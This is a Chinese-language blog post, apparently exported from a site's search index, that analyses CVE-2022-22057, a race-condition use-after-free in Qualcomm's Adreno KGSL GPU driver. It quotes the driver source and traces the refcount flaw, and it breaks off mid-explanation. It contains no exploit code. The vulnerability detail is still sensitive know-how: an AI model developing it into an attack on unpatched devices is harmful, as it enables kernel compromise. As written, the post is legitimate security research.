<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2022-22057_GPU漏洞分析(非完整版)</title>
    <link href="/2024/12/20/36__CVE-2022-22057_GPU_%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/12/20/36__CVE-2022-22057_GPU_%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="分析背景"><a href="#分析背景" class="headerlink" title="分析背景"></a>分析背景</h2><p>目前发布的很多中高端手机中都存在GPU 芯片，这些GPU芯片和NPU芯片一起被集成在CPU 芯片中，当前主流的GPU芯片厂商主要是英伟达，高通晓龙，联发科。本文分析高通骁龙的GPU 驱动中存在的UAF 漏洞，在kernel 中，是以kgsl 驱动提供给用户空间，此驱动提供给用户空间接口来与Adreno GPU  进行通信。由于应用程序需要访问驱动程序才能进行自我渲染，并且需要以极低的延迟来调用GPU进行工作， 也是使用高通芯片组的手机可以从第三方应用程序直接访问的少数驱动程序之一，另外 kgsl 驱动代码对内存共享逻辑的复杂性，可能会出现内存问题，比如 条件竞争下的UAF、double free。</p><p>当前公开披露的GPU 漏洞和漏洞报告少之又少，分析难度也很大，本文从CVE-2022-22057 漏洞入手，分析 kernel msm 中的 gpu ，了解 GPU 的漏洞挖掘和分析思路。</p><p>主要参考报告：<br>    <a href="https://github.blog/security/vulnerability-research/the-android-kernel-mitigations-obstacle-race/">https://github.blog/security/vulnerability-research/the-android-kernel-mitigations-obstacle-race/</a><br>    <a href="https://securitylab.github.com/advisories/GHSL-2022-037_msm_kernel/">https://securitylab.github.com/advisories/GHSL-2022-037_msm_kernel/</a><br>这些报告已经写的很详细了，看完报告后，虽然大概的理解了漏洞诱因，仍然是似懂非懂，很不过瘾，于是便入手找到源码，开始分析漏洞原因，这里不得不说一句，使用 cursor 来协助进行源代码分析可以很好的帮助理解某些函数的功能，以及kernel 特定的宏和函数定义。</p><h2 id="adreno-KGSL-driver-初始化"><a href="#adreno-KGSL-driver-初始化" class="headerlink" title="adreno KGSL driver 初始化"></a>adreno KGSL driver 初始化</h2><p>Adreno GPU 子系统的架构图如下图所示，图来源于： <a href="https://docs.qualcomm.com/bundle/publicresource/topics/80-70014-19/graphics-overview.html">https://docs.qualcomm.com/bundle/publicresource/topics/80-70014-19/graphics-overview.html</a></p><p>在一个装载有Adreno GPU 的设备中，为了能在GPU 中执行计算，应用程序利用Wayland 协议，使用 EGL&#x2F;OpenGL ES 来开始图形渲染，其中会涉及到一些渲染的命令传递给OpenGL ES，随后在kernel 层，这些命令会被编译成GPU 指令集，通过 KGSL驱动 发送到GPU 芯片。<br><img src="/36__CVE-2022-22057_GPU_%E6%BC%8F%E6%B4%9E.assets/image-20241213220425361.png"><br>根据架构图大概知道GPU芯片主要是与 kgsl 驱动 在kernel 和hardware 之间进行交互。kgsl 驱动在设备中表现为 &#x2F;dev&#x2F;kgsl-3d0， 其中的 0 表示GPU 处理单元的序号。</p><p>这里梳理一下有关Adreno GPU 在kernel 中初始化加载的流程：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs rust">int __init <span class="hljs-title function_ invoke__">kgsl_3d_init</span>(void) --<span class="hljs-punctuation">-&gt;</span>  <span class="hljs-number">1</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">platform_driver</span> adreno_platform_driver --<span class="hljs-punctuation">-&gt;</span>  <span class="hljs-number">2</span><br>int <span class="hljs-title function_ invoke__">adreno_probe</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">platform_device</span> *pdev) --<span class="hljs-punctuation">-&gt;</span>  <span class="hljs-number">3</span> <br>int <span class="hljs-title function_ invoke__">adreno_bind</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">device</span> *dev) --<span class="hljs-punctuation">-&gt;</span>  <span class="hljs-number">4</span> <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">adreno_gpu_core</span> * <span class="hljs-title function_ invoke__">adreno_identify_gpu</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">platform_device</span> *pdev, <span class="hljs-type">u32</span> *chipid) --<span class="hljs-punctuation">-&gt;</span>  <span class="hljs-number">5</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">adreno_gpu_core</span> * _get_gpu_core(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">platform_device</span> *pdev, unsigned int chipid) --<span class="hljs-punctuation">-&gt;</span>  <span class="hljs-number">6</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">adreno_gpu_core</span> *adreno_gpulist[] --<span class="hljs-punctuation">-&gt;</span> <span class="hljs-number">7</span> <br><span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">adreno_a3xx_core</span> adreno_gpu_core_a306 -<span class="hljs-punctuation">-&gt;</span>  <span class="hljs-number">8</span> <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">adreno_gpudev</span> adreno_a3xx_gpudev --<span class="hljs-punctuation">-&gt;</span> <span class="hljs-number">9</span> <br><span class="hljs-title function_ invoke__">a3xx_probe</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">platform_device</span> *pdev,<br>        <span class="hljs-type">u32</span> chipid, <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">adreno_gpu_core</span> *gpucore) --<span class="hljs-punctuation">-&gt;</span>  <span class="hljs-number">10</span><br>adreno.c/<span class="hljs-title function_ invoke__">adreno_device_probe</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">platform_device</span> *pdev,<span class="hljs-keyword">struct</span> <span class="hljs-title class_">adreno_device</span> *adreno_dev)  --<span class="hljs-punctuation">-&gt;</span>  <span class="hljs-number">11</span><br>adreno.c/<span class="hljs-title function_ invoke__">adreno_setup_device</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">adreno_device</span> *adreno_dev) --<span class="hljs-punctuation">-&gt;</span>  <span class="hljs-number">12</span><br>kgsl.c/<span class="hljs-title function_ invoke__">kgsl_device_platform_probe</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">kgsl_device</span> *device) --<span class="hljs-punctuation">-&gt;</span> <span class="hljs-number">13</span><br>kgsl.c/_register_device(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">kgsl_device</span> *device)  --<span class="hljs-punctuation">-&gt;</span> <span class="hljs-number">14</span><br><span class="hljs-title function_ invoke__">device_create</span>(kgsl_driver.class,&amp;device<span class="hljs-punctuation">-&gt;</span>pdev<span class="hljs-punctuation">-&gt;</span>dev,dev, device,device<span class="hljs-punctuation">-&gt;</span>name);<br></code></pre></td></tr></table></figure><p>\1.  kernel 会根据设备的芯片型号，触发gpulist 中对应的回调函数。<br>\2.a3xx_probe 函数是Adreno A3XX 系列GPU 的探测函数主要用于初始化GPU 设备。<br>\3. 经过一些配置后，会调用probe 函数，将gpu 的进行初始化。<br>\4. 接着会进入到adreno_device_probe 函数中，初始化设备，比如kgsl-3d0，设置设备驱动数据。<br>\5. kgsl_device_platform_probe函数会创建字符设备到&#x2F;dev，初始化电源，物理地址到虚拟地址的映射等。<br>\6. kgsl_core_init 用于 kgsl  驱动初始化，注册 kgsl_fops 中的ioctl 回调函数。</p><h2 id="驱动ioctl-注册和调用过程"><a href="#驱动ioctl-注册和调用过程" class="headerlink" title="驱动ioctl 注册和调用过程"></a>驱动ioctl 注册和调用过程</h2><p>ioctl 注册 和 调用 流程：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">adreno.c /kgsl_3d_init(<span class="hljs-type">void</span>) ---&gt;  <span class="hljs-number">1</span><br>kgsl.c / __init kgsl_core_init(<span class="hljs-type">void</span>) ---&gt;  <span class="hljs-number">2</span><br>kgsl.c / <span class="hljs-keyword">struct</span> file_operations kgsl_fops ---&gt;  <span class="hljs-number">3</span><br>kgsl_ioctl.c / <span class="hljs-type">long</span> kgsl_ioctl(<span class="hljs-keyword">struct</span> file *filep, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg) ---&gt; <span class="hljs-number">4</span><br>kgsl_ioctl.c / <span class="hljs-type">long</span> kgsl_ioctl_helper(<span class="hljs-keyword">struct</span> file *filep, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg, <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> kgsl_ioctl *cmds, <span class="hljs-type">int</span> len) ---&gt; <span class="hljs-number">5</span><br>kgsl_ioctl.c / <span class="hljs-keyword">struct</span> kgsl_ioctl kgsl_ioctl_funcs[] ---&gt; <span class="hljs-number">6</span><br>kgsl_timeline.c / <span class="hljs-type">long</span> kgsl_ioctl_timeline_fence_get(<span class="hljs-keyword">struct</span> kgsl_device_private *dev_priv, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">void</span> *data) ---&gt;  <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>首先是进行init 初始化内核驱动模块，将 kgsl_fops 文件操作结构体注册到kgsl-3d0 设备驱动内，具体的file_operations 所示：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">static const struct file_operations kgsl_fops = &#123;<br><span class="hljs-string">.owner</span> = THIS_MODULE,<br><span class="hljs-string">.release</span> = kgsl_release,<br><span class="hljs-string">.open</span> = kgsl_open,<br><span class="hljs-string">.mmap</span> = kgsl_mmap,<br><span class="hljs-string">.read</span> = kgsl_read,<br><span class="hljs-string">.get_unmapped_area</span> = kgsl_get_unmapped_area,<br><span class="hljs-string">.unlocked_ioctl</span> = kgsl_ioctl,<br><span class="hljs-string">.compat_ioctl</span> = kgsl_compat_ioctl,<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中的 ioctl(kgsl_ioctl)  主要调用kgsl_ioctl_helper 来区分用户空间传入的ioctl 操作码对应的回调函数。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xl">long kgsl_ioctl(struct file *filep, unsigned int cmd, unsigned long arg)<br>&#123;<br><span class="hljs-function"><span class="hljs-title">struct</span> kgsl_device_private *dev_priv = filep-&gt;</span>private_data;<br><span class="hljs-function"><span class="hljs-title">struct</span> kgsl_device *device = dev_priv-&gt;</span>device;<br>long ret;<br>ret = kgsl_ioctl_helper(filep, cmd, arg, kgsl_ioctl_funcs,<br>ARRAY_SIZE(kgsl_ioctl_funcs));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If the command was unrecognized in the generic core, try the device</span><br><span class="hljs-comment"> * specific function</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ret == -ENOIOCTLCMD) &#123;<br><span class="hljs-function"><span class="hljs-title">if</span> (is_compat_task() &amp;&amp; device-&gt;</span><span class="hljs-function"><span class="hljs-title">ftbl</span>-&gt;</span>compat_ioctl != NULL)<br><span class="hljs-function"><span class="hljs-title">return</span> device-&gt;</span><span class="hljs-function"><span class="hljs-title">ftbl</span>-&gt;</span>compat_ioctl(dev_priv, cmd, arg);<br><span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> (device-&gt;</span><span class="hljs-function"><span class="hljs-title">ftbl</span>-&gt;</span>ioctl != NULL)<br><span class="hljs-function"><span class="hljs-title">return</span> device-&gt;</span><span class="hljs-function"><span class="hljs-title">ftbl</span>-&gt;</span>ioctl(dev_priv, cmd, arg);<br>&#125;<br>return ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>这些不同ioctl cmd 的回调统一由 kgsl_ioctl_func 进行管理，如下所示，</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">KGSL_IOCTL_FUNC</span>(IOCTL_KGSL_TIMELINE_CREATE,<br>kgsl_ioctl_timeline_create),<br><span class="hljs-built_in">KGSL_IOCTL_FUNC</span>(IOCTL_KGSL_TIMELINE_WAIT,<br>kgsl_ioctl_timeline_wait),<br><span class="hljs-built_in">KGSL_IOCTL_FUNC</span>(IOCTL_KGSL_TIMELINE_FENCE_GET,<br>kgsl_ioctl_timeline_fence_get),<br><span class="hljs-built_in">KGSL_IOCTL_FUNC</span>(IOCTL_KGSL_TIMELINE_QUERY,<br>kgsl_ioctl_timeline_query),<br><span class="hljs-built_in">KGSL_IOCTL_FUNC</span>(IOCTL_KGSL_TIMELINE_SIGNAL,<br>kgsl_ioctl_timeline_signal),<br><span class="hljs-built_in">KGSL_IOCTL_FUNC</span>(IOCTL_KGSL_TIMELINE_DESTROY,<br>kgsl_ioctl_timeline_destroy),<br></code></pre></td></tr></table></figure><p>如果传入 IOCTL_KGSL_TIMELINE_FENCE_GET，将调用 kgsl_ioctl_timeline_fence_get 回调来处理传入的data数据。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据漏洞描述和其他的漏洞分析报告，可以明确的知道这是一个由条件竞争引发的 refcount 计数错误造成的释放后重用的漏洞。而且产生漏洞的代码是当时在Qualcomm msm5.4 kernel 分支中引入新功能以及相关的新的ioctl 时产生的。</p><p>这个漏洞主要发生在kgsl_timeline.c  中，其中有一些相关的ioctl 进行调用，这些函数均注册在kgsl_ioctl_func 数组内。</p><p>本漏洞的条件竞争主要涉及这三个函数：</p><ul><li>kgsl_ioctl_timeline_fence_get(struct kgsl_device_private *dev_priv, unsigned int cmd, void *data) 或者 kgsl_ioctl_timeline_wait()</li><li>timeline_fence_release(struct dma_fence *fence)</li><li>kgsl_ioctl_timeline_destroy(struct kgsl_device_private *dev_priv, unsigned int cmd, void *data)</li></ul><p>接下来将围绕这三个函数进行介绍：</p><h3 id="kgsl-ioctl-timeline-fence-get"><a href="#kgsl-ioctl-timeline-fence-get" class="headerlink" title="kgsl_ioctl_timeline_fence_get"></a>kgsl_ioctl_timeline_fence_get</h3><p>kgsl_ioctl_timeline_fence_get函数可以通过 <code>IOCTL_KGSL_TIMELINE_FENCE_GET</code> 进行调用，这个函数执行逻辑如下：</p><ul><li>kgsl_timeline_by_id 获取传入data 中定义的timeline</li><li>kgsl_timeline_fence_alloc 接着将生成一个 fence，并初始化 dma_fence  引用计数1，然后将生成的fence 添加到timeline 的fences列表并按照升序排列。</li><li>sync_file_create 函数创建一个sync_file 用于和文件描述符fd 对应，同时会将fence 引用计数再+1，然后将文件handle 返回给用户。</li><li>函数执行到末尾会调用 dma_fence_put 来让在sync_file_create 增加的引用计数 -1, 因为fence在这里已经使用完了。</li><li>但如果 fd 获取不到，那么将直接跳到 dma_fence_put 将fence 引用计数-1，而这会触发dma_fence_release。<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">long</span> <span class="hljs-title">kgsl_ioctl_timeline_fence_get</span>(<span class="hljs-params"><span class="hljs-keyword">struct</span> kgsl_device_private *dev_priv, unsigned <span class="hljs-built_in">int</span> cmd, <span class="hljs-keyword">void</span> *data</span>)</span> &#123;<br>    <span class="hljs-keyword">struct</span> kgsl_device *device = dev_priv-&gt;device;<br>    <span class="hljs-keyword">struct</span> kgsl_timeline_fence_get *param = data;<br>    <span class="hljs-keyword">struct</span> kgsl_timeline *timeline;<br>    <span class="hljs-keyword">struct</span> sync_file *sync_file;<br>    <span class="hljs-keyword">struct</span> dma_fence *fence;<br>    <span class="hljs-built_in">int</span> ret = <span class="hljs-number">0</span>, fd;<br><br>    timeline = kgsl_timeline_by_id(device, param-&gt;timeline);<br>    <span class="hljs-keyword">if</span> (!timeline)<br>        <span class="hljs-keyword">return</span> -ENODEV;<br>    fence = kgsl_timeline_fence_alloc(timeline, param-&gt;seqno);      <span class="hljs-comment">// 分配fence，fence引用计数+1  </span><br><br>    <span class="hljs-keyword">if</span> (IS_ERR(fence)) &#123;<br>        kgsl_timeline_put(timeline);<br>        <span class="hljs-keyword">return</span> PTR_ERR(fence);<br>    &#125;<br>    fd = get_unused_fd_flags(O_CLOEXEC);        <span class="hljs-comment">// 获取一个未使用的fd</span><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        ret = fd;<br>        <span class="hljs-keyword">goto</span> <span class="hljs-keyword">out</span>;<br>    &#125;<br>    sync_file = sync_file_create(fence); <span class="hljs-comment">// 创建sync_file fence引用计数+1  = 2</span><br>    <span class="hljs-keyword">if</span> (sync_file) &#123;<br>        fd_install(fd, sync_file-&gt;file);<br>        param-&gt;handle = fd;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        put_unused_fd(fd);<br>        ret = -ENOMEM;<br>    &#125;<br><span class="hljs-keyword">out</span>:<br>    dma_fence_put(fence); <span class="hljs-comment">// fence -1 = 1    kref_put(&amp;fence-&gt;refcount, dma_fence_release); 如果引用计数为0，则调用dma_fence_release</span><br>    kgsl_timeline_put(timeline);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>为了能够理解dms_fence 和fence 的概念，这是kgsl_timeline_fence 结构体<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">kgsl_timeline_fence</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">dma_fence</span> base;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">kgsl_timeline</span> *timeline;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">list_head</span> node;<br>&#125;;<br></code></pre></td></tr></table></figure>在经过kgsl_timeline_fence_alloc 函数执行的时候，声明的是kgsl_timeline_fence 结构体，其中包含 dma_fence 和 kgsl_timeline 结构体。可能是便于将dma_fence 添加到 kgsl_timeline 时间线内。<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dma_fence</span> *<span class="hljs-title function_ invoke__">kgsl_timeline_fence_alloc</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">kgsl_timeline</span> *timeline,<span class="hljs-type">u64</span> seqno)<br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">kgsl_timeline_fence</span> *fence;<br><br>    fence = <span class="hljs-title function_ invoke__">kzalloc</span>(<span class="hljs-title function_ invoke__">sizeof</span>(*fence), GFP_KERNEL);    <span class="hljs-comment">// 分配fence</span><br>    ...<br>    fence<span class="hljs-punctuation">-&gt;</span>timeline = <span class="hljs-title function_ invoke__">kgsl_timeline_get</span>(timeline);     <span class="hljs-comment">//  增加timeline的引用计数</span><br>...<br><span class="hljs-title function_ invoke__">dma_fence_init</span>(&amp;fence<span class="hljs-punctuation">-&gt;</span>base, &amp;timeline_fence_ops,<br>        &amp;timeline<span class="hljs-punctuation">-&gt;</span>lock, timeline<span class="hljs-punctuation">-&gt;</span>context, seqno);  <span class="hljs-comment">// 初始化fence 并且将fence引用计数设置为1</span><br>...<br>    <span class="hljs-title function_ invoke__">kgsl_timeline_add_fence</span>(timeline, fence);   <span class="hljs-comment">// 将 fence 添加到 timeline 的 fences 列表中，并且fences 按照升序排列    </span><br>    <span class="hljs-keyword">return</span> &amp;fence<span class="hljs-punctuation">-&gt;</span>base;    <br></code></pre></td></tr></table></figure></li></ul><p>当使用dma_fence_put 减少引用计数时，如果计数降到0，就会触发dma_fence_release 函数。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">static inline void <span class="hljs-built_in">dma_fence_put</span>(struct dma_fence *fence)<br>&#123;<br>    if (fence)<br>        <span class="hljs-built_in">kref_put</span>(&amp;fence-&gt;refcount, dma_fence_release);<br>&#125;<br></code></pre></td></tr></table></figure><p>在dma_fence_release 函数中，会触发 release（timeline_fence_release ）回调:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">    <span class="hljs-function"><span class="hljs-title">if</span> (fence-&gt;</span><span class="hljs-function"><span class="hljs-title">ops</span>-&gt;</span>release)<br>        <span class="hljs-function"><span class="hljs-title">fence</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">ops</span>-&gt;</span>release(fence);<br>    <span class="hljs-keyword">else</span><br>        dma_fence_free(fence);<br></code></pre></td></tr></table></figure><p>其中timeline_fence_release 函数会释放 dma_fence </p><h3 id="timeline-fence-release"><a href="#timeline-fence-release" class="headerlink" title="timeline_fence_release"></a>timeline_fence_release</h3><p>当dma_fence 引用计数为0 的之后会触发dma_fence_put 函数 中的timeline_fence_release 函数。这个函数会调用dma_fence_free 来释放dma_fence。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void timeline_fence_release(struct dma_fence *fence)<br>&#123;<br>    struct kgsl_timeline_fence *f = to_timeline_fence(fence); <span class="hljs-comment">// 获取fence对应的timeline_fence</span><br>    <span class="hljs-function"><span class="hljs-title">struct</span> kgsl_timeline *timeline = f-&gt;</span>timeline;<br>    struct kgsl_timeline_fence *cur, *temp;<br>    unsigned long flags;<br>  <br>    <span class="hljs-function"><span class="hljs-title">spin_lock_irqsave</span>(&amp;timeline-&gt;</span>fence_lock, flags); <span class="hljs-comment">// 锁住fence_lock</span><br>    <span class="hljs-comment">/* If the fence is still on the active list, remove it */</span><br>    <span class="hljs-function"><span class="hljs-title">list_for_each_entry_safe</span>(cur, temp, &amp;timeline-&gt;</span>fences, node) &#123;<br>        <span class="hljs-keyword">if</span> (f != cur)<br>            continue;<br>        <span class="hljs-function"><span class="hljs-title">list_del_init</span>(&amp;f-&gt;</span>node); <span class="hljs-comment">// 删除fence</span><br>        break;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">spin_unlock_irqrestore</span>(&amp;timeline-&gt;</span>fence_lock, flags); <span class="hljs-comment">// 解锁fence_lock</span><br>    <span class="hljs-function"><span class="hljs-title">trace_kgsl_timeline_fence_release</span>(f-&gt;</span><span class="hljs-function"><span class="hljs-title">timeline</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">id</span>, fence-&gt;</span>seqno);<br>    <span class="hljs-function"><span class="hljs-title">kgsl_timeline_put</span>(f-&gt;</span>timeline);<br>    dma_fence_free(fence); <span class="hljs-comment">// 释放fence</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kgsl-ioctl-timeline-destroy"><a href="#kgsl-ioctl-timeline-destroy" class="headerlink" title="kgsl_ioctl_timeline_destroy"></a>kgsl_ioctl_timeline_destroy</h3><p>kgsl_ioctl_timeline_destroy 函数是用于销毁timeline 中的fence。</p><ul><li>前面一个锁内的内容，遍历&amp;timeline-&gt;fences 列表内的所有fence，然后增加一个引用计数。然后将timeline-&gt;fences 复制到另一个列表 temp，现在temp 中包含了所有的fence。</li><li>后面的锁内的内容，会一次遍历temp 中的每个fence。<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xl">long kgsl_ioctl_timeline_destroy(struct kgsl_device_private *dev_priv,<br>        unsigned int cmd, void *<span class="hljs-keyword">data</span>) <span class="hljs-comment">// 销毁timeline</span><br>&#123;<br>    <span class="hljs-function"><span class="hljs-title">struct</span> kgsl_device *device = dev_priv-&gt;</span>device;<br>    struct kgsl_timeline_fence *fence, *tmp;<br>    struct kgsl_timeline *timeline;<br>    struct list_head temp;<br>    u32 *param = <span class="hljs-keyword">data</span>;<br>    ...<br>    INIT_LIST_HEAD(&amp;temp);<br>    <span class="hljs-function"><span class="hljs-title">spin_lock</span>(&amp;timeline-&gt;</span>fence_lock);   <span class="hljs-comment">// 锁住fence_lock</span><br>    <span class="hljs-function"><span class="hljs-title">list_for_each_entry_safe</span>(fence, tmp, &amp;timeline-&gt;</span>fences, node)<br>        <span class="hljs-function"><span class="hljs-title">dma_fence_get</span>(&amp;fence-&gt;</span>base);<br>    <span class="hljs-function"><span class="hljs-title">list_replace_init</span>(&amp;timeline-&gt;</span>fences, &amp;temp);<br>    <span class="hljs-function"><span class="hljs-title">spin_unlock</span>(&amp;timeline-&gt;</span>fence_lock); <span class="hljs-comment">// 解锁fence_lock</span><br><br>    <span class="hljs-function"><span class="hljs-title">spin_lock_irq</span>(&amp;timeline-&gt;</span>lock); <span class="hljs-comment">// 锁住lock</span><br>    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;<br>        <span class="hljs-function"><span class="hljs-title">dma_fence_set_error</span>(&amp;fence-&gt;</span>base, -ENOENT);<br>        <span class="hljs-function"><span class="hljs-title">dma_fence_signal_locked</span>(&amp;fence-&gt;</span>base);<br>        <span class="hljs-function"><span class="hljs-title">dma_fence_put</span>(&amp;fence-&gt;</span>base);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">spin_unlock_irq</span>(&amp;timeline-&gt;</span>lock); <span class="hljs-comment">// 解锁lock</span><br>    kgsl_timeline_put(timeline);<br>    return timeline ? <span class="hljs-number">0</span> : -ENODEV;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="悬空指针的产生"><a href="#悬空指针的产生" class="headerlink" title="悬空指针的产生"></a>悬空指针的产生</h3><p>UAF 漏洞触发的关键是，在释放内存后产生悬空指针。在timeline_fence_release函数释放fence会产生一个dma_fence 指针，因此如果dma_fence指针变成了悬空指针，那么就有触发 use 的可能性。 </p><p>前面我们了解到，如果在kgsl_ioctl_timeline_fence_get 函数中，文件描述符被用户关闭了，就会立马调用 timeline_fence_release 释放它们。如果有另一个线程在timeline_fence_release 释放之后获取线程锁，并获取kgsl_timeline_fence引用，就会导致dma_fence悬空指针被使用。</p><p>多线程条件竞争操作如下所示：<br><img src="/36__CVE-2022-22057_GPU_%E6%BC%8F%E6%B4%9E.assets/Drawing2024-12-1811.05.55.png"><br>在 Thread1 